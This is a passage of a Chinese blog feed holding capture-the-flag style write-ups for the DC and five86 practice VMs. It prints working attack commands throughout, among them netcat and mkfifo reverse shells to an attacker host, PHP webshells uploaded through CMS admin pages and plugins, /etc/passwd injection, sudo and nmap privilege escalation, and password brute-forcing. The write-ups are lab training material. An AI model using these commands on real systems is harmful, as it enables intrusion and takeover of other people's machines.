class="line">-Matching Defaults entries for charles on dc-4:</span><br><span class="line">-    env\_reset, mail\_badpass,</span><br><span class="line">-    secure\_path\=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">-User charles may run the following commands on dc-4:</span><br><span class="line">-    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">echo &quot;test1::0:0:root:/root:/bin/bash&quot;|sudo teehee -a /etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4jim-20231014174928-ysbsd0z.png" alt="DC4jim">you have mail  ——–！</p><p>​![屏幕截图 2023-10-14 175249](assets&#x2F;屏幕截图 2023-10-14 175249-20231014175257-iai8fdl.png)​</p><p>​![屏幕截图 2023-10-14 175655](assets&#x2F;屏幕截图 2023-10-14 175655-20231014175702-i898vay.png)​</p><h3 id="提权"><a href="#提权" class="headerlink" title="#提权"></a>#提权</h3><p>​![屏幕截图 2023-10-14 180532](assets&#x2F;屏幕截图 2023-10-14 180532-20231014180627-uzpewua.png)</p><h3 id="​​拿下​"><a href="#​​拿下​" class="headerlink" title="​​拿下​"></a>​​拿下​</h3><p>​![屏幕截图 2023-10-14 180539](assets&#x2F;屏幕截图 2023-10-14 180539-20231014180642-f59cxs9.png)​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-6</title>
      <link href="/2024/04/11/DC/DC-6/"/>
      <url>/2024/04/11/DC/DC-6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>#主机探测 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -sP 192.168.43.0/24</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Darp-scan-20231016164829-5z8wr5m.png" alt="Darp-scan">​</p><p>‍</p><p>#端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -T4 -sS -sV 192.168.43.9</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dnmap-20231016164837-bqhvan4.png" alt="Dnmap">​</p><p>#目录爆破 ​​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://wordy </span><br></pre></td></tr></table></figure><p>​<img src="/assets/Ddirsearch-20231016164853-anemsx4.png" alt="Ddirsearch">​</p><p>#指纹识​​别 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.43.9</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dwhatweb-20231016164910-9sma5wr.png" alt="Dwhatweb">​</p><p>#web登录界面</p><p>‍</p><p>#wpscan爆破账密</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.43.9 -e u</span><br><span class="line">wpscan --url http://192.168.43.9 -U user.txt -P passwords.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dwpsacn-U-P-20231016164923-hp8lfsv.png" alt="Dwpsacn-U-P">​</p><p>#WordPress插件存在RCE</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ls</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dac%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231016164958-8rlxfdb.png" alt="Dac插件命令执行">​</p><p>#反弹shell </p><p>网站存在输入限制，BP抓包改</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lvvp 8888</span><br><span class="line">BP:</span><br><span class="line">nc -e /bin/bash 192.168.43.33 8888</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dkali%E5%8F%8D%E5%BC%B9sehll-20231016165007-e38c173.png" alt="Dkali反弹sehll">​</p><p>#水平越权—sudo -l</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">存在jens可以无密码执行/home/jens/backups.sh</span><br><span class="line">graham下存在一个jens无密码就可以运行的.sh</span><br><span class="line">#！/bin/bash</span><br><span class="line"></span><br><span class="line">cat /home/</span><br><span class="line">#提权</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; backups.sh</span><br><span class="line"></span><br><span class="line">sudo -u jens ./backups.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dmark%E4%B8%8B%E6%8F%90%E7%A4%BA-20231016165013-ttzz8je.png" alt="Dmark下提示"></p><p>​​<img src="/assets/Dssh-graham@-20231016165029-ihdpt6f.png" alt="Dssh-graham@"></p><p>​​<img src="/assets/D%E4%BD%8E%E6%9D%83%E9%99%90graham%E6%8F%90%E6%9D%83-20231016165058-ir83db4.png" alt="D低权限graham提权">​</p><p>#nmap提权 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">存在root无密码运行nmap</span><br><span class="line">‍‍```</span><br><span class="line">  namp提权</span><br><span class="line">‍‍```</span><br><span class="line"></span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">-&gt;root</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Djens%E7%9A%84shell-20231016165105-rjj8mp0.png" alt="Djens的shell">​</p><p>#FLAG</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/theflag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dnmap%E6%8F%90%E6%9D%83flag-20231016165111-ipzo8pk.png" alt="Dnmap提权flag">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five靶机-1</title>
      <link href="/2024/04/11/five/five86-1/"/>
      <url>/2024/04/11/five/five86-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="five86-1"><a href="#five86-1" class="headerlink" title="five86-1"></a>five86-1</h1><h2 id="主机探测-端口扫描"><a href="#主机探测-端口扫描" class="headerlink" title="#主机探测-端口扫描"></a>#主机探测-端口扫描</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -T4 -F -sS -sV 192.168.43.14</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F1-20231023151941-pwm7csc.png" alt="F1">​</p><h2 id="指纹识别-目录爆破"><a href="#指纹识别-目录爆破" class="headerlink" title="#指纹识别-目录爆破"></a>#指纹识别-目录爆破</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.14：10000</span><br><span class="line">dirsearch -u 192.168.43.14 </span><br></pre></td></tr></table></figure><p>​<img src="/assets/F13-20231023160631-117t8lz.png" alt="F13">​</p><h2 id="web界面"><a href="#web界面" class="headerlink" title="#web界面"></a>#web界面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">80端口什么都没有</span><br><span class="line">10000端口存在webmin登录界面</span><br><span class="line">#本人心想一眼就是CMS框架，直接百度webmin漏洞复现，结果试了几个CVE，反而啪啪打脸</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>安全警告-Webmin 1.920 on five86-1.localdomain（Debian Linux 10）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">#看到这个webMin的安全警告，不信邪，又试了一波，无果而终！</span><br><span class="line">#随后换了个思路，发现目录爆破出一个ona（OpenNetAdmin）尝试访问</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-23 152223](assets&#x2F;屏幕截图 2023-10-23 152223-20231023152310-nu36y3t.png)​</p><h2 id="访问ona界面"><a href="#访问ona界面" class="headerlink" title="#访问ona界面"></a>#访问ona界面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看这想一个管理界面</span><br><span class="line">又有版本提示，毕竟是靶机，直接searchsploit一波</span><br><span class="line">#根据信息提示：版本：18.1.1</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F14-20231023161014-j80ihf8.png" alt="F14">​</p><h2 id="RCE打过去"><a href="#RCE打过去" class="headerlink" title="#RCE打过去"></a>#RCE打过去</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin 18.1.1</span><br><span class="line">#github搜EXP开打</span><br><span class="line">#或者是使用searchsploit，不过这里有个坑点，就是要对这个bash脚本进行转换格式，否则会报错</span><br><span class="line">#使用dos2unix 47691.sh这个命令，而且这里的shell不能转成TTY</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/F15-20231023162337-2scht31.png" alt="F15">​​</p><p>​<img src="/assets/F21-20231023162956-hpv1loq.png" alt="F21">​</p><p>​<img src="/assets/F22-20231023162956-xz0g70h.png" alt="F22">​</p><h2 id="尝试提权"><a href="#尝试提权" class="headerlink" title="#尝试提权"></a>#尝试提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#尝试了一波，发现对回显做了限制，以及cd命令禁用</span><br><span class="line">#查看当前用户具有权限的文件，</span><br><span class="line">#只有三个部分</span><br><span class="line">#/proc </span><br><span class="line">#/var/www/html/reports/.htaccess </span><br><span class="line">#/var/log/ona.log</span><br><span class="line">whoami</span><br><span class="line">find / -type f -user www-data</span><br><span class="line">#结果发现只有/var/www/html/reports/.htaccess有权限</span><br><span class="line">cat /var/www/html/reports/.htaccess</span><br><span class="line">#再查看/var/www/.htpasswd得到一串密文</span><br><span class="line">cat /var/www/.htpasswd</span><br><span class="line">douglas:apr19fgG/hiM\$BtsL9qpNHUlylaLxk81qY1</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fcat-20231023164624-26txoyz.png" alt="Fcat">​</p><p>​![屏幕截图 2023-10-23 164158](assets&#x2F;屏幕截图 2023-10-23 164158-20231023164624-ewrbutt.png)​</p><p>​<img src="/assets/Fbaudu%E7%BF%BB%E8%AF%91-20231023165114-55q570t.png" alt="Fbaudu翻译">​</p><h2 id="尝试解密"><a href="#尝试解密" class="headerlink" title="#尝试解密"></a>#尝试解密</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#根据提示..给了douglas的哈希值....使用crunch生成对应的字典</span><br><span class="line">crunch 10 10 aefhrt &gt; mima.txt</span><br><span class="line">#john破解</span><br><span class="line">john --wordlist=mima.txt hash.txt</span><br><span class="line">#得到账密</span><br><span class="line">douglas:fatherrrrr</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fmima-20231023171036-783ndre.png" alt="Fmima">​</p><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="#ssh登录"></a>#ssh登录</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh douglas@192.168.43.14</span><br><span class="line">#无法切换到其他用户</span><br><span class="line">#.ssh下存在id_rsa  id_rsa.pub</span><br><span class="line">#百度解释：↓</span><br><span class="line">#假设用户是 blue，执行 ssh-keygen 时，才会在 .ssh 这个目录里面产生所需要的两把 Keys ，分别是私钥 (id_rsa) 与公钥 (id_rsa.pub)。</span><br><span class="line">#注：Linux 是在 home/.ssh/ 目录下，而 Windows 是在 C:\Users\Feng\.ssh 目录下。</span><br><span class="line">#扩展：authorized_keys</span><br><span class="line">#就是为了让两个 Linux 机器之间使用 ssh 不需要用户名和密码。采用了数字签名 RSA 或者 DSA 来完成这个操作。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fsshdog-20231023170959-qesjr5h.png" alt="Fsshdog"></p><p>​​<img src="/assets/Fdog%E6%9D%83%E9%99%90%E4%BD%8E-20231023171345-5lfz1y4.png" alt="Fdog权限低">​</p><h2 id="尝试提权-1"><a href="#尝试提权-1" class="headerlink" title="#尝试提权"></a>#尝试提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#douglas可以用jen的身份运行cp命令</span><br><span class="line">#联想到之前的公钥私钥，直接复制到jen的/home下</span><br><span class="line">#用douglas的id_rsa文件登陆jen的ssh，也即免密登陆jen的ssh。</span><br><span class="line">#复制到/tmp目录下是因为jen没有权限访问douglas目录下的文件</span><br><span class="line">cp .ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh</span><br></pre></td></tr></table></figure><p>​![SUDO -L](assets&#x2F;SUDO -L-20231023172045-pdadsq1.png)</p><p>​<img src="/assets/Fjen-20231023172906-j2q9628.png" alt="Fjen">​</p><h2 id="jen信息收集"><a href="#jen信息收集" class="headerlink" title="#jen信息收集"></a>#jen信息收集</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#提示You have new mail</span><br><span class="line">cd /var/mail</span><br><span class="line">cat jen</span><br><span class="line">#得到moss密码:Fire!Fire!</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MOSS%E5%AF%86%E7%A0%81-20231023173200-xg0m0ii.png" alt="MOSS密码">​</p><h2 id="登录moss"><a href="#登录moss" class="headerlink" title="#登录moss"></a>#登录moss</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh moss@127.0.0.1</span><br><span class="line">#发现存在.game目录</span><br><span class="line">#存在root的二进制文件，不知道干啥的</span><br></pre></td></tr></table></figure><p>‍</p><h2 id="提权"><a href="#提权" class="headerlink" title="#提权"></a>#提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">#无果</span><br><span class="line">find -user root -perm -4000 -prnit 2&gt;/dev/null</span><br><span class="line">#只有一个upyougame</span><br><span class="line">./upyougame </span><br><span class="line">#提权成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/FIND%E6%8F%90%E6%9D%83-20231023174434-rrdagj9.png" alt="FIND提权">​</p><p>​![屏幕截图 2023-10-23 174309](assets&#x2F;屏幕截图 2023-10-23 174309-20231023174319-1e43e68.png)​</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="#FLAG"></a>#FLAG</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-23 174348](assets&#x2F;屏幕截图 2023-10-23 174348-20231023174353-iauk535.png)​</p>]]></content>
      
      
      <categories>
          
          <category> Five靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Five靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-7</title>
      <link href="/2024/04/11/DC/DC-7/"/>
      <url>/2024/04/11/DC/DC-7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><p>#主机探测 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpscan -l</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7arpscan-20231017150328-rvmhtyp.png" alt="D7arpscan">​</p><p>#端口探测 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F T4 -sS -sV 1192.168.43.11</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-nmap-20231017150338-ve5hj9i.png" alt="D7-nmap">​</p><p>#指纹识别 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.11 </span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-%E6%8F%92%E4%BB%B6-20231017150345-qxso63d.png" alt="D7-插件"></p><p>​​<img src="/assets/D7-whatweb-20231017150357-5iuuhxs.png" alt="D7-whatweb">​</p><p>#目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.43.11</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-dirsearch-20231017150402-b070as6.png" alt="D7-dirsearch">​</p><p>#web页面 </p><p>#drupal 8.7.6版本 –DC7USER–github源码–得到账密</p><p>​![屏幕截图 2023-10-17 145609](assets&#x2F;屏幕截图 2023-10-17 145609-20231017150411-5tl1kdc.png)</p><p>​</p><p>​<img src="/assets/D7-8.7.6-20231017150418-6vqj711.png" alt="D7-8.7.6">​</p><p>#ssh登录 —You have mail</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh dc7user@192.168.43.11</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-ssh-20231017150427-yi10abb.png" alt="D7-ssh"></p><p>​​<img src="/assets/D7-ssh2-20231017150439-bglmukf.png" alt="D7-ssh2">​</p><p>#查看mail </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure><p>‍</p><p>#&#x2F;opt&#x2F;scripts&#x2F;backups.sh </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个定时任务</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-var.html-20231017150444-qr144nv.png" alt="D7-var.html">​</p><p>#改admin 密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin  --password=&quot;admin&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-gai%E5%AF%86%E7%A0%81-20231017150450-es1dwb7.png" alt="D7-gai密码">​</p><p>#登录web界面 –上🐎子 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php system(&#x27;nc -e /bin/bash 192.168.43.33 8888&#x27;) ?&gt;</span></span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">nc -lvvp 8888</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>#kali反弹shell  —www-data</p><p>​<img src="/assets/D7-web%F0%9F%90%8E%E5%AD%90-20231017150457-ejtgksa.png" alt="D7-web🐎子"></p><p>​</p><p>​![D7-kali-NC (2)](assets&#x2F;D7-kali-NC 2-20231017150511-38fu6zy.png)​</p><p>#提权root</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lvvp 9998</span><br><span class="line">www-data:</span><br><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.43.33 9998 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-%E6%8F%90%E6%9D%83-20231017150518-dzw3nov.png" alt="D7-提权"></p><p>​​![屏幕截图 2023-10-17 144414](assets&#x2F;屏幕截图 2023-10-17 144414-20231017150530-rjnwlx2.png)​</p><p>#FLAG</p><p>​<img src="/assets/D-flag-20231017150535-fw7evev.png" alt="D-flag">​</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five靶机-2</title>
      <link href="/2024/04/11/five/five86-2/"/>
      <url>/2024/04/11/five/five86-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="five86-2"><a href="#five86-2" class="headerlink" title="five86-2"></a>five86-2</h1><h2 id="主机探测-端口扫描"><a href="#主机探测-端口扫描" class="headerlink" title="#主机探测-端口扫描"></a>#主机探测-端口扫描</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -T4 -F -sS -sV 192.168.43.15</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F12-20231024142427-ai0fsj0.png" alt="F12">​</p><h2 id="指纹识别-目录爆破"><a href="#指纹识别-目录爆破" class="headerlink" title="#指纹识别-目录爆破"></a>#指纹识别-目录爆破</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.15</span><br><span class="line">dirsearch -u 192.168.43.15</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F34-20231024142433-kalzd95.png" alt="F34">​</p><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="#wpscan"></a>#wpscan</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#爆破用户名</span><br><span class="line">wpscan --url http://192.168.43.15 -e u</span><br><span class="line">#爆破密码</span><br><span class="line">wpscan --url http://192.168.43.15 -P /usr/share/wordlists/rockyou.txt  -U use.txt</span><br><span class="line">#得到账密</span><br><span class="line">Username: barney</span><br><span class="line">Password: spooky1</span><br><span class="line">Username: stephen</span><br><span class="line">Password: apollo1</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-24 115909](assets&#x2F;屏幕截图 2023-10-24 115909-20231024142442-rr6lir0.png)</p><p>​​<img src="/assets/MI%E5%AF%86%E7%A0%81-20231024142452-dl36pyk.png" alt="MI密码">​</p><h2 id="登录web界面"><a href="#登录web界面" class="headerlink" title="#登录web界面"></a>#登录web界面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#barney spooky1</span><br><span class="line">#可以看到这个站点安装了三个插件，但是只激活了一个Insert or Embed Articulate Content into WordPress Trial（IEAC）</span><br></pre></td></tr></table></figure><p>​<img src="/assets/web-20231024142500-lpq3wj7.png" alt="web">​</p><h2 id="利用插件漏洞"><a href="#利用插件漏洞" class="headerlink" title="#利用插件漏洞"></a>#利用插件漏洞</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#WordPress插件IEAC漏洞分析及组合利用尝试</span><br><span class="line">#https://www.freebuf.com/vuls/205735.html</span><br><span class="line">#该插件主要是可以快速的向文章中嵌入自己的学习内容(e-Learing)，同时该插件可以直接对zip压缩文件进行处理，文件可以先压缩到zip中再一起上传到服务器中。</span><br><span class="line">#生成poc.zip</span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">html</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">html</span>&gt;</span>&quot; &gt; index.html</span><br><span class="line">echo &quot;<span class="meta">&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span>&quot; &gt; index.php</span><br><span class="line">zip poc.zip index.html index.php</span><br><span class="line">#上传POC.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/ICEA%E4%B8%8A%E4%BC%A0zip-20231024142510-4feoitf.png" alt="ICEA上传zip">​</p><p>​![屏幕截图 2023-10-24 131528](assets&#x2F;屏幕截图 2023-10-24 131528-20231024142519-uswoghd.png)​</p><p>​![屏幕截图 2023-10-24 131559](assets&#x2F;屏幕截图 2023-10-24 131559-20231024142519-c75zo60.png)</p><p>​​![屏幕截图 2023-10-24 132312](assets&#x2F;屏幕截图 2023-10-24 132312-20231024142535-752sfuo.png)​</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="#反弹shell"></a>#反弹shell</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#上传EXP.zip</span><br><span class="line">#利用kali自带的php-reverse-shell脚本反弹shell</span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">html</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">html</span>&gt;</span>&quot; &gt; index.html</span><br><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php shell.php</span><br><span class="line">zip poc2222.zip index.html shell.php</span><br><span class="line">#kali监听</span><br><span class="line">nc -lvvp 8888</span><br><span class="line">#交互式</span><br><span class="line">pyhton3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/shell--WEB-20231024142547-6up1vz5.png" alt="shell--WEB">​</p><p>​<img 